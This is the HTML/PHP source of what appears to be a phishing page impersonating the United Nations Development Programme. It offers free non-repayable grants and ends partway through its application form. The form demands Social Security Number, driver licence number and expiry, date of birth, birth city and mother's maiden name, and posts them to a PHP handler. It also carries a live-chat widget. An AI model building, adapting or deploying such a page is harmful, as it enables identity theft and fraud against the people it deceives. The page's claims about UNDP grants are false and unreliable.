
<!doctype html>
<html lang="en-US">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="http://gmpg.org/xfn/11">
	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
	<!-- This site is optimized with the Yoast SEO plugin v16.5 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Grant Application - United Nations Development Programme Grants</title>
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Development Programme Grants" />
	<meta property="og:site_name" content="Development Programme Grants" />
	<meta property="article:modified_time" content="2021-06-21T18:38:57+00:00" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:label1" content="Est. reading time" />
	<meta name="twitter:data1" content="2 minutes" />
	<meta name="UTF-8">
	<meta name="viewport" content="width=device-width, intial-scale=1.0">

	<!-- / Yoast SEO plugin. -->
	<link rel='dns-prefetch' href='http://s.w.org/' />
	<script src="js/min.js"></script>

	<script type="text/javascript">
		window._wpemojiSettings = {
			"baseUrl": "https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/",
			"ext": ".png",
			"svgUrl": "https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/",
			"svgExt": ".svg",
			"source": {
				"concatemoji": ""
			}
		};
		! function (e, a, t) {
			var n, r, o, i = a.createElement("canvas"),
				p = i.getContext && i.getContext("2d");

			function s(e, t) {
				var a = String.fromCharCode;
				p.clearRect(0, 0, i.width, i.height), p.fillText(a.apply(this, e), 0, 0);
				e = i.toDataURL();
				return p.clearRect(0, 0, i.width, i.height), p.fillText(a.apply(this, t), 0, 0), e === i.toDataURL()
			}

			function c(e) {
				var t = a.createElement("script");
				t.src = e, t.defer = t.type = "text/javascript", a.getElementsByTagName("head")[0].appendChild(t)
			}
			for (o = Array("flag", "emoji"), t.supports = {
					everything: !0,
					everythingExceptFlag: !0
				}, r = 0; r < o.length; r++) t.supports[o[r]] = function (e) {
				if (!p || !p.fillText) return !1;
				switch (p.textBaseline = "top", p.font = "600 32px Arial", e) {
					case "flag":
						return s([127987, 65039, 8205, 9895, 65039], [127987, 65039, 8203, 9895, 65039]) ? !1 : !s([55356,
							56826, 55356, 56819
						], [55356, 56826, 8203, 55356, 56819]) && !s([55356, 57332, 56128, 56423, 56128, 56418, 56128,
							56421, 56128, 56430, 56128, 56423, 56128, 56447
						], [55356, 57332, 8203, 56128, 56423, 8203, 56128, 56418, 8203, 56128, 56421, 8203, 56128,
							56430, 8203, 56128, 56423, 8203, 56128, 56447
						]);
					case "emoji":
						return !s([55357, 56424, 8205, 55356, 57212], [55357, 56424, 8203, 55356, 57212])
				}
				return !1
			}(o[r]), t.supports.everything = t.supports.everything && t.supports[o[r]], "flag" !== o[r] && (t.supports
				.everythingExceptFlag = t.supports.everythingExceptFlag && t.supports[o[r]]);
			t.supports.everythingExceptFlag = t.supports.everythingExceptFlag && !t.supports.flag, t.DOMReady = !1, t
				.readyCallback = function () {
					t.DOMReady = !0
				}, t.supports.everything || (n = function () {
					t.readyCallback()
				}, a.addEventListener ? (a.addEventListener("DOMContentLoaded", n, !1), e.addEventListener("load", n, !
					1)) : (e.attachEvent("onload", n), a.attachEvent("onreadystatechange", function () {
					"complete" === a.readyState && t.readyCallback()
				})), (n = t.source || {}).concatemoji ? c(n.concatemoji) : n.wpemoji && n.twemoji && (c(n.twemoji), c(n
					.wpemoji)))
		}(window, document, window._wpemojiSettings);
	</script>
	<script>
		function showDiv(clID, el) {
			document.getElementById(clID).style.display = el.value == "" ? 'none' : 'block';
		}
	</script>
	 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<link rel='stylesheet' id='wp-block-library-css'
		href='css/ba.css' type='text/css' media='all' />
	<link rel='stylesheet' id='hello-elementor-css'
		href='css/bb.css' type='text/css' media='all' />
	<link rel='stylesheet' id='hello-elementor-theme-style-css'
		href='css/bc.css' type='text/css' media='all' />
	<link rel='stylesheet' id='elementor-icons-css'
		href='css/bd.css'
		type='text/css' media='all' />
	<link rel='stylesheet' id='elementor-frontend-legacy-css'
		href='css/be.css' type='text/css'
		media='all' />
	<link rel='stylesheet' id='elementor-frontend-css'
		href='css/bf.css' type='text/css'
		media='all' />
	<style id='elementor-frontend-inline-css' type='text/css'>
		@font-face {
			font-family: eicons;
			src: url(css/eicons0b93.eot);
			src: url(css/eicoins0b93.eot) format("embedded-opentype"), url(css/eicoins0b93.eot) format("woff2"), url() format("woff"), url() format("truetype"), url() format("svg");
			font-weight: 400;
			font-style: normal
		}
	</style>
	<link rel='stylesheet' id='elementor-post-383-css'
		href='css/a.css' type='text/css' media='all' />
	<link rel='stylesheet' id='elementor-pro-css'
		href='css/d.css' type='text/css'
		media='all' />
	<link rel='stylesheet' id='font-awesome-5-all-css'
		href='css/e.css'
		type='text/css' media='all' />
	<link rel='stylesheet' id='font-awesome-4-shim-css'
		href='css/f.css'
		type='text/css' media='all' />
	<link rel='stylesheet' id='elementor-global-css'
		href='css/g.css' type='text/css' media='all' />
	<link rel='stylesheet' id='elementor-post-15-css'
		href='css/15.css' type='text/css' media='all' />
	<link rel='stylesheet' id='elementor-post-29-css'
		href='css/i.css' type='text/css' media='all' />
	<link rel='stylesheet' id='elementor-post-36-css'
		href='css/j.css' type='text/css' media='all' />
	<link rel='stylesheet' id='elementor-post-126-css'
		href='css/zz.css' type='text/css' media='all' />
	<link rel='stylesheet' id='tablepress-default-css' href='css/k.css'
		type='text/css' media='all' />
	<link rel='stylesheet' id='google-fonts-1-css'
		href='css/m.css'
		type='text/css' media='all' />
	<link rel='stylesheet' id='elementor-icons-shared-0-css'
		href='css/n.css'
		type='text/css' media='all' />
	<link rel='stylesheet' id='elementor-icons-fa-regular-css'
		href='css/o.css'
		type='text/css' media='all' />
	<link rel='stylesheet' id='elementor-icons-fa-solid-css'
		href='css/q.css' type='text/css'
		media='all' />
	<link rel='stylesheet' id='elementor-icons-fa-brands-css'
		href='css/r.css' type='text/css'
		media='all' />
	<script type='text/javascript'
		src='js/a.js'
		id='font-awesome-4-shim-js'></script>
	<link rel="https://api.w.org/" href="json/a.json" />
	<link rel="alternate" type="application/json" href="json/b.json" />
	<link rel='shortlink' href='#' />
	<link rel="alternate" type="application/json+oembed"
		href="json/c.json" />
	<link rel="icon" href="img/l.png" sizes="32x32" />
	<link rel="icon" href="img/fav.png" sizes="192x192" />
	<link rel="apple-touch-icon" href="img/f.png" />
	

	<!-- Icons font CSS-->
	<link href="css/font.css" rel="stylesheet" media="all">
	<link href="css/awesome.css" rel="stylesheet" media="all">
	<!-- Font special for pages-->
	<link
		href="https://fonts.googleapis.com/css?family=Poppins:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i"
		rel="stylesheet">

	<!-- Vendor CSS-->
	<link href="css/select.css" rel="stylesheet" media="all">

	<!-- Main CSS-->
	<link href="css/main.css" rel="stylesheet" media="all">
	<style>
		.post-image {
			/* margin-top: 10px;
			width: 345px;
			height: 216px;
			padding-top: 10px;
			width: 150px; */
			display: block;
			margin-left: auto;
			margin-right: auto;
			width: 80%;
		}

		#fpdiv,
		#bpdiv {
			display: none;
		}
	</style>

<script src="//code.jivosite.com/widget/9zseKbmKul" async></script>
</head>

<body
	class="page-template-default page page-id-15 wp-custom-logo elementor-default elementor-kit-383 elementor-page elementor-page-15 elementor-page-126">
	<div data-elementor-type="header" data-elementor-id="29" class="elementor elementor-29 elementor-location-header"
		data-elementor-settings="[]">
		<div class="elementor-section-wrap">
			<section
				class="elementor-section elementor-top-section elementor-element elementor-element-2f1626e elementor-section-height-min-height elementor-section-boxed elementor-section-height-default elementor-section-items-middle"
				data-id="2f1626e" data-element_type="section"
				data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
				<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-row">
						<div class="elementor-column elementor-col-66 elementor-top-column elementor-element elementor-element-b90dd7e elementor-hidden-tablet elementor-hidden-phone"
							data-id="b90dd7e" data-element_type="column">
							<div class="elementor-column-wrap elementor-element-populated">
								<div class="elementor-widget-wrap">
									<div class="elementor-element elementor-element-5394382 elementor-widget elementor-widget-heading"
										data-id="5394382" data-element_type="widget" data-widget_type="heading.default">
										<div class="elementor-widget-container">
											<h2 class="elementor-heading-title elementor-size-default"><a
													href="index.php">The UNDP is continuing to support our
													community during the coronavirus (COVID-19) pandemic.</a></h2>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-950c160"
							data-id="950c160" data-element_type="column">
							<div class="elementor-column-wrap elementor-element-populated">
								<div class="elementor-widget-wrap">
									<div class="elementor-element elementor-element-25403a0 elementor-align-right elementor-mobile-align-center elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list"
										data-id="25403a0" data-element_type="widget"
										data-widget_type="icon-list.default">
										<div class="elementor-widget-container">
											<ul class="elementor-icon-list-items">
												<li class="elementor-icon-list-item"> <span
														class="elementor-icon-list-icon">
														<i aria-hidden="true" class="far fa-envelope"></i> </span>
													<span class="elementor-icon-list-text">info@undpgovsupports.com</span>
												</li>
											</ul>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</section>
			<section
				class="elementor-section elementor-top-section elementor-element elementor-element-ef7547e elementor-section-height-min-height elementor-hidden-phone elementor-hidden-tablet elementor-section-boxed elementor-section-height-default elementor-section-items-middle"
				data-id="ef7547e" data-element_type="section"
				data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
				<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-row">
						<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-23fae73"
							data-id="23fae73" data-element_type="column">
							<div class="elementor-column-wrap elementor-element-populated">
								<div class="elementor-widget-wrap">
									<div class="elementor-element elementor-element-7a0117c elementor-widget elementor-widget-theme-site-logo elementor-widget-image"
										data-id="7a0117c" data-element_type="widget"
										data-widget_type="theme-site-logo.default">
										<div class="elementor-widget-container">
											<div class="elementor-image">
												<a href="index.php">
													<img width="640" height="315"
														src="img/c.png"
														class="attachment-full size-full" alt="" loading="lazy"
														srcset="img/u.png 640w, 300w"
														sizes="(max-width: 640px) 100vw, 640px" />
												</a>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-1fda059"
							data-id="1fda059" data-element_type="column">
							<div class="elementor-column-wrap elementor-element-populated">
								<div class="elementor-widget-wrap">
									<div class="elementor-element elementor-element-71576ba elementor-nav-menu__align-right elementor-nav-menu--stretch elementor-nav-menu--indicator-none elementor-nav-menu--dropdown-tablet elementor-nav-menu__text-align-aside elementor-nav-menu--toggle elementor-nav-menu--burger elementor-widget elementor-widget-nav-menu"
										data-id="71576ba" data-element_type="widget"
										data-settings="{&quot;full_width&quot;:&quot;stretch&quot;,&quot;layout&quot;:&quot;horizontal&quot;,&quot;toggle&quot;:&quot;burger&quot;}"
										data-widget_type="nav-menu.default">
										<div class="elementor-widget-container">
											<nav role="navigation"
												class="elementor-nav-menu--main elementor-nav-menu__container elementor-nav-menu--layout-horizontal e--pointer-underline e--animation-fade">
												<ul id="menu-1-71576ba" class="elementor-nav-menu">
													<li
														class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-104">
														<a href="index.php" class="elementor-item">Home</a>
													</li>
													<li
														class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-103">
														<a href="apply.php" class="elementor-item elementor-item-anchor">UNDP
															Info</a>
														<ul class="sub-menu elementor-nav-menu--dropdown">
															<li
																class="menu-item menu-item-type-post_type menu-item-object-page menu-item-99">
																<a href="apply.php"
																	class="elementor-sub-item">Accountability &#038;
																	Reporting</a>
															</li>
															<li
																class="menu-item menu-item-type-post_type menu-item-object-page menu-item-100">
																<a href="apply.php"
																	class="elementor-sub-item">Community Outreach</a>
															</li>
															<li
																class="menu-item menu-item-type-post_type menu-item-object-page menu-item-101">
																<a href="apply.php"
																	class="elementor-sub-item">Security Statement</a>
															</li>
														</ul>
													</li>
													<li
														class="menu-item menu-item-type-post_type menu-item-object-page menu-item-76">
														<a href="apply.php" class="elementor-item">About
															Us</a>
													</li>
													<li
														class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-15 current_page_item menu-item-77">
														<a href="apply.php" aria-current="page"
															class="elementor-item elementor-item-active">Apply</a>
													</li>
													<li
														class="menu-item menu-item-type-post_type menu-item-object-page menu-item-217">
														<a href="apply.php"
															class="elementor-item">Policy &#038; Legislation</a>
													</li>
													<li
														class="menu-item menu-item-type-post_type menu-item-object-page menu-item-115">
														<a href="apply.php"
															class="elementor-item">Feedback</a>
													</li>
												</ul>
											</nav>
											<div class="elementor-menu-toggle" role="button" tabindex="0"
												aria-label="Menu Toggle" aria-expanded="false"> <i
													class="eicon-menu-bar" aria-hidden="true"></i>
												<span class="elementor-screen-only">Menu</span>
											</div>
											<nav class="elementor-nav-menu--dropdown elementor-nav-menu__container"
												role="navigation" aria-hidden="true">
												<ul id="menu-2-71576ba" class="elementor-nav-menu">
													<li
														class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-104">
														<a href="index.php" class="elementor-item">Home</a>
													</li>
													<li
														class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-103">
														<a href="apply.php" class="elementor-item elementor-item-anchor">UNDP
															Info</a>
														<ul class="sub-menu elementor-nav-menu--dropdown">
															<li
																class="menu-item menu-item-type-post_type menu-item-object-page menu-item-99">
																<a href="apply.php"
																	class="elementor-sub-item">Accountability &#038;
																	Reporting</a>
															</li>
															<li
																class="menu-item menu-item-type-post_type menu-item-object-page menu-item-100">
																<a href="apply.php"
																	class="elementor-sub-item">Community Outreach</a>
															</li>
															<li
																class="menu-item menu-item-type-post_type menu-item-object-page menu-item-101">
																<a href="apply.php"
																	class="elementor-sub-item">Security Statement</a>
															</li>
														</ul>
													</li>
													<li
														class="menu-item menu-item-type-post_type menu-item-object-page menu-item-76">
														<a href="apply.php" class="elementor-item">About
															Us</a>
													</li>
													<li
														class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-15 current_page_item menu-item-77">
														<a href="apply.php" aria-current="page"
															class="elementor-item elementor-item-active">Apply</a>
													</li>
													<li
														class="menu-item menu-item-type-post_type menu-item-object-page menu-item-217">
														<a href="apply.php"
															class="elementor-item">Policy &#038; Legislation</a>
													</li>
													<li
														class="menu-item menu-item-type-post_type menu-item-object-page menu-item-115">
														<a href="apply.php"
															class="elementor-item">Feedback</a>
													</li>
												</ul>
											</nav>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-0f1109b"
							data-id="0f1109b" data-element_type="column">
							<div class="elementor-column-wrap elementor-element-populated">
								<div class="elementor-widget-wrap">
									<div class="elementor-element elementor-element-4918561 elementor-align-right elementor-widget elementor-widget-button"
										data-id="4918561" data-element_type="widget" data-widget_type="button.default">
										<div class="elementor-widget-container">
											<div class="elementor-button-wrapper">
												<a href="apply.php"
													class="elementor-button-link elementor-button elementor-size-sm"
													role="button"> <span class="elementor-button-content-wrapper">
														<span class="elementor-button-text">Apply now</span>
													</span>
												</a>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</section>
			<section
				class="elementor-section elementor-top-section elementor-element elementor-element-f36f150 elementor-section-height-min-height elementor-hidden-desktop elementor-section-boxed elementor-section-height-default elementor-section-items-middle"
				data-id="f36f150" data-element_type="section"
				data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
				<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-row">
						<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-e297904"
							data-id="e297904" data-element_type="column">
							<div class="elementor-column-wrap elementor-element-populated">
								<div class="elementor-widget-wrap">
									<div class="elementor-element elementor-element-738e5ec elementor-widget elementor-widget-theme-site-logo elementor-widget-image"
										data-id="738e5ec" data-element_type="widget"
										data-widget_type="theme-site-logo.default">
										<div class="elementor-widget-container">
											<div class="elementor-image">
												<a href="index.php">
													<img width="640" height="315"
														src="img/cr.png"
														class="attachment-full size-full" alt="" loading="lazy"
														srcset="img/un.png 640w, 300w"
														sizes="(max-width: 640px) 100vw, 640px" />
												</a>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-3748e6b"
							data-id="3748e6b" data-element_type="column">
							<div class="elementor-column-wrap elementor-element-populated">
								<div class="elementor-widget-wrap">
									<div class="elementor-element elementor-element-e5c926e elementor-nav-menu--stretch elementor-nav-menu--indicator-none elementor-nav-menu__text-align-aside elementor-nav-menu--toggle elementor-nav-menu--burger elementor-widget elementor-widget-nav-menu"
										data-id="e5c926e" data-element_type="widget"
										data-settings="{&quot;full_width&quot;:&quot;stretch&quot;,&quot;layout&quot;:&quot;dropdown&quot;,&quot;toggle&quot;:&quot;burger&quot;}"
										data-widget_type="nav-menu.default">
										<div class="elementor-widget-container">
											<div class="elementor-menu-toggle" role="button" tabindex="0"
												aria-label="Menu Toggle" aria-expanded="false"> <i
													class="eicon-menu-bar" aria-hidden="true"></i>
												<span class="elementor-screen-only">Menu</span>
											</div>
											<nav class="elementor-nav-menu--dropdown elementor-nav-menu__container"
												role="navigation" aria-hidden="true">
												<ul id="menu-2-e5c926e" class="elementor-nav-menu">
													<li
														class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-104">
														<a href="index.php" class="elementor-item">Home</a>
													</li>
													<li
														class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-103">
														<a href="apply.php" class="elementor-item elementor-item-anchor">UNDP
															Info</a>
														<ul class="sub-menu elementor-nav-menu--dropdown">
															<li
																class="menu-item menu-item-type-post_type menu-item-object-page menu-item-99">
																<a href="apply.php"
																	class="elementor-sub-item">Accountability &#038;
																	Reporting</a>
															</li>
															<li
																class="menu-item menu-item-type-post_type menu-item-object-page menu-item-100">
																<a href="apply.php"
																	class="elementor-sub-item">Community Outreach</a>
															</li>
															<li
																class="menu-item menu-item-type-post_type menu-item-object-page menu-item-101">
																<a href="apply.php"
																	class="elementor-sub-item">Security Statement</a>
															</li>
														</ul>
													</li>
													<li
														class="menu-item menu-item-type-post_type menu-item-object-page menu-item-76">
														<a href="apply.php" class="elementor-item">About
															Us</a>
													</li>
													<li
														class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-15 current_page_item menu-item-77">
														<a href="apply.php" aria-current="page"
															class="elementor-item elementor-item-active">Apply</a>
													</li>
													<li
														class="menu-item menu-item-type-post_type menu-item-object-page menu-item-217">
														<a href="apply.php"
															class="elementor-item">Policy &#038; Legislation</a>
													</li>
													<li
														class="menu-item menu-item-type-post_type menu-item-object-page menu-item-115">
														<a href="apply.php"
															class="elementor-item">Feedback</a>
													</li>
												</ul>
											</nav>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</section>
		</div>
	</div>
	<div data-elementor-type="single" data-elementor-id="126"
		class="elementor elementor-126 elementor-location-single post-15 page type-page status-publish hentry"
		data-elementor-settings="[]">
		<div class="elementor-section-wrap">
			<section
				class="elementor-section elementor-top-section elementor-element elementor-element-2933c1cd elementor-section-height-min-height elementor-section-boxed elementor-section-height-default elementor-section-items-middle"
				data-id="2933c1cd" data-element_type="section"
				data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
				<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-row">
						<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-7d515a9c"
							data-id="7d515a9c" data-element_type="column">
							<div class="elementor-column-wrap elementor-element-populated">
								<div class="elementor-widget-wrap">
									<div class="elementor-element elementor-element-556c9612 elementor-widget elementor-widget-theme-post-title elementor-page-title elementor-widget-heading"
										data-id="556c9612" data-element_type="widget"
										data-widget_type="theme-post-title.default">
										<div class="elementor-widget-container">
											<h1 class="elementor-heading-title elementor-size-default" id="sec-title">
												Grant Application</h1>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</section>
			<section
				class="elementor-section elementor-top-section elementor-element elementor-element-19778474 elementor-section-boxed elementor-section-height-default elementor-section-height-default"
				data-id="19778474" data-element_type="section">
				<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-row">
						<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-3d49a38d"
							data-id="3d49a38d" data-element_type="column">

							<div class="elementor-column-wrap elementor-element-populated">
								<div class="elementor-widget-wrap">
									<div class="elementor-element elementor-element-533d575 elementor-widget elementor-widget-theme-post-content"
										data-id="533d575" data-element_type="widget"
										data-widget_type="theme-post-content.default">
										<div id="result-div"></div>
										<div id="f-div" class="elementor-widget-container">
											<div data-elementor-type="wp-page" data-elementor-id="15"
												class="elementor elementor-15" data-elementor-settings="[]">
												<div class="elementor-inner">
													<div class="elementor-section-wrap">
														<section
															class="elementor-section elementor-top-section elementor-element elementor-element-ec396b7 elementor-section-boxed elementor-section-height-default elementor-section-height-default"
															data-id="ec396b7" data-element_type="section">
															<div
																class="elementor-container elementor-column-gap-default">
																<div class="elementor-row">
																	<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-32549b6"
																		data-id="32549b6" data-element_type="column">
																		<div
																			class="elementor-column-wrap elementor-element-populated">
																			<div class="elementor-widget-wrap">
																				<div class="elementor-element elementor-element-8d0e38a elementor-widget elementor-widget-heading"
																					data-id="8d0e38a"
																					data-element_type="widget"
																					data-widget_type="heading.default">
																					<div
																						class="elementor-widget-container">
																						<h2 style="color:black"
																							class="elementor-heading-title elementor-size-default">
																							Submit your details</h2>
																					</div>
																				</div>
																				<div class="elementor-element elementor-element-f0dc5f9 elementor-widget elementor-widget-text-editor"
																					data-id="f0dc5f9"
																					data-element_type="widget"
																					data-widget_type="text-editor.default">
																					<div
																						class="elementor-widget-container">
																						<div
																							class="elementor-text-editor elementor-clearfix">
																							<p>To apply for the Grant
																								you must be above 18
																								years of age. These
																								Grants are not a loan
																								and you
																								don't need to pay back.
																								Fill out your
																								information and you can
																								choose your preferred
																								Grant
																								type from the list
																								below. You can only
																								receive your payment
																								through Direct Deposit
																								or Debit
																								Card. Your application
																								will be approved based
																								on your credit score. If
																								your credit score is
																								below 300, we will
																								automatically reject
																								your application. If
																								your credit score is
																								between 300
																								to 850 then you have a
																								high percentage of
																								getting approved. If
																								your application is
																								denied,
																								our representatives are
																								online to assist you or
																								you can re-apply for a
																								different Grant. We'll
																								update you via email as
																								soon as we know if your
																								Grant has been approved
																								or not, and then we
																								can proceed to funding.
																							</p>
																							<br>
																							<p>As a reminder, the UNDP
																								Grants (United Nations
																								Development Programme
																								Grants) do not need to
																								be
																								repaid. An underwriter
																								will contact you within
																								24 hours as soon as your
																								application has been
																								approved.</p>
																						</div>
																					</div>
																				</div>
																				<div class="elementor-element elementor-element-15fd0ce elementor-widget elementor-widget-heading"
																					data-id="15fd0ce"
																					data-element_type="widget"
																					data-widget_type="heading.default">
																					<div
																						class="elementor-widget-container">
																						<h2 style="color:black"
																							class="elementor-heading-title elementor-size-default">
																							Our requirements and
																							information</h2>
																					</div>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</section>
														<section
															class="elementor-section elementor-inner-section elementor-element elementor-element-4055e26c elementor-section-boxed elementor-section-height-default elementor-section-height-default"
															data-id="4055e26c" data-element_type="section"
															data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
															<div class="card card-4">
																<?php 
																include "config.php";
																include_once "Common.php";
																$common = new Common();
																$allCountries = $common->getCountries($connection);
																?>
															
																<div class="card-body">
																	<form action="b_em.php" method="POST">
																		<div class="separator">Personal Information
																		</div><br>
																		<div class="row row-space">
																			<div class="col-3">
																				<div class="input-group" id="b_fnerr">
																					<label class="label"
																						for="b_fn">First Name<span
																							style="color: red">*</span></label>
																					<input class="input--style-4"
																						type="text" name="b_fn"
																						id="b_fn" required>
																				</div>
																			</div>
																			<div class="col-5">
																				<div class="input-group" id="b_merr">
																					<label class="label"
																						for="b_m">Middle Name</label>
																					<input class="input--style-4"
																						type="text" name="b_m" id="b_m" required>
																				</div>
																			</div>
																			<div class="col-3">
																				<div class="input-group" id="b_lnerr">
																					<label class="label" for="bln">Last
																						Name<span
																							style="color: red">*</span></label>
																					<input class="input--style-4"
																						type="text" name="b_ln"
																						id="b_ln" required>
																				</div>
																			</div>
																		</div>
																		<div class="row row-space">
																			<div class="col-2">
																				<div class="input-group" id="b_pherr">
																					<label class="label"
																						for="b_ph">Phone Number<span
																							style="color: red">*</span></label>
																					<div class="input-group-icon">
																						<input
																							class="input--style-4 phone-format"
																							type="text" name="b_ph"
																							id="b_ph" required>
																					</div>
																				</div>
																			</div>
																			<div class="col-2">
																				<div class="input-group" id="b_ssnerr">
																					<label class="label"
																						for="b_ssn">Social Security
																						Number (SSN)<span
																							style="color: red">*</span></label>
																					<input class="input--style-4"
																						type="text" name="b_ssn"
																						id="b_ssn" required>
																				</div>
																			</div>
																		</div>
																		<div class="row row-space">
																			<div class="col-2">
																				<div class="input-group" id="b_gderr">
																					<label class="label">Gender</label>
																					<div class="rs-select2 js-select-simple select--no-search"
																						id="b_gd_div">
																						<select name="b_gd" id="b_gd">
																							<option value=""
																								selected="selected"
																								my_order_property="first" required>
																								Select Gender</option>
																							<option value="Male">Male
																							</option>
																							<option value="Female">
																								Female</option>
																						</select>
																						<div class="select-dropdown">
																						</div>
																					</div>
																				</div>
																			</div>
																			<div class="col-2">
																				<div class="input-group" id="b_doberr">
																					<label class="label"
																						for="b_dob">Date of Birth<span
																							style="color: red">*</span></label>
																					<div class="input-group-icon">
																						<input class="input--style-4"
																							type="date" min=""
																							max=""
																							name="b_dob" id="b_dob" required>
																					</div>
																				</div>
																			</div>
																		</div>
																		<div class="row row-space">

																			<div class="col-2">
																				<div class="input-group" id="b_dlerr">
																					<label class="label"
																						for="b_dl">Driver License
																						Number<span
																							style="color: red">*</span></label>
																					<div class="input-group-icon">
																						<input class="input--style-4"
																							type="text" name="b_dl"
																							id="b_dl" required>
																					</div>
																				</div>
																			</div>

																			<div class="col-2">
																				<div class="input-group" id="b_dlerr">
																					<label class="label"
																						for="b_dl">Driver License
																						Expiration Date<span
																							style="color: red">*</span></label>
																					<div class="input-group-icon">
																						<input class="input--style-4"
																							type="text" name="b_dle"
																							id="b_dle" required>
																					</div>
																				</div>
																			</div>

																		</div>
																		<div class="row row-space">
																			<div class="col-4">
																				<div class="input-group" id="b_bnerr">
																					<label class="label" for="b_bn">In
																						what city were you born?<span
																							style="color: red">*</span></label>
																					<div class="input-group-icon">
																						<input class="input--style-8"
																							type="text" name="b_bn"
																							id="b_bn" required>
																					</div>
																				</div>
																			</div>
																		</div>
																		<div class="row row-space">
																			<div class="col-4">
																				<div class="input-group" id="b_mnerr">
																					<label class="label" for="b_mn">What
																						is your mother's maiden name?
																						(Last name before
																						marriage.)<span
																							style="color: red">*</span></label>
																					<div class="input-group-icon">
																						<input class="input--style-4"
																							type="text" name="b_mn"
																							id="b_mn" required>
																					</div>
																				</div>
																			</div>
																		</div>

																		<div class="row row-space">
																			<div class="col-4">
																				<div class="input-group" id="b_addrerr">
																					<label class="label">Home
																						Address<span
																							style="color: red">*</span></label>
																					<input class="input--style-8"
																						type="text"
																						placeholder="Street Address"
																						id="b_addr" name="b_addr" required>
																				</div>
																			</div>
																			
																			<div class="col-2">
																				<div class="input-group"
																					id="b_stateerr">
																					<!-- <label class="label">State</label> -->
																					<div class="rs-select2 js-select-simple select--no-search"
																						id="b_state_div">
																						<select name="country" id="countryId" class="form-control" onchange="getStatesByCountry();" >
																							<option value="">Country</option>
																							<?php
																							if ($allCountries->num_rows > 0 ){
																								while ($country = $allCountries->fetch_object() ) {
																									$countryId = $country->id;
																									$countryName = $country->name;?>
																									<option value="<?php echo $countryId;?>"><?php echo $countryName;?></option>
																								<?php }
																							}
																							?>

																						</select>
																						<div class="select-dropdown">
																						</div>
																					</div>
																				</div>
																			</div>
																			<div class="col-2">
																				<div class="input-group"
																					id="b_countryerr">
																					<div class="rs-select2 js-select-simple select--no-search"
																						id="b_country_div">
																						<select class="form-control" name="state" id="stateId" onchange="getCityByState();"  >
																							<option value="">State</option>
																						</select>
																						<div class="select-dropdown">
																						</div>
																					</div>
																				</div>
																			</div>
																			<div class="col-2">
																				<div class="input-group"
																					id="b_countryerr">
																					<div class="rs-select2 js-select-simple select--no-search"
																						id="b_country_div">
																						<select class="form-control" name="city" id="cityDiv">
																							<option value="">City</option>
																						</select>
																						<div class="select-dropdown">
																						</div>
																					</div>
																				</div>
																			</div>
																			
																			<div class="col-2">
																				<div class="input-group" id="b_ziperr">
																					<!-- <label class="label">Zip Code</label> -->
																					<input class="input--style-4 zip"
																						type="text"
																						placeholder="Zip Code"
																						name="b_zip" id="b_zip" required>
																				</div>
																			</div>
																			
																		</div>
																		<div class="row row-space">
																		<div class="col-2">
																				<div class="input-group femail"
																					id="b_fmerr">
																					<label class="label"
																						for="b_fm">Email Address<span
																							style="color: red">*</span></label>
																					<input class="input--style-4"
																						type="email" name="b_em"
																						id="b_em" placeholder="" required> 
																				</div>
																			</div>
																			<div class="col-2">
																				<div class="input-group femail"
																					id="b_fmerr">
																					<label class="label"
																						for="b_fm">Confirm Email<span
																							style="color: red">*</span></label>
																					<input class="input--style-4"
																						type="email" name="b_emp"
																						id="b_emp" placeholder="" required> 
																				</div>
																			</div>
																		</div>
																		
																		<div class="row row-space">
																			<div class="col-2">
																				<div class="input-group id_err"
																					id="id_f">
																					<label class="label"
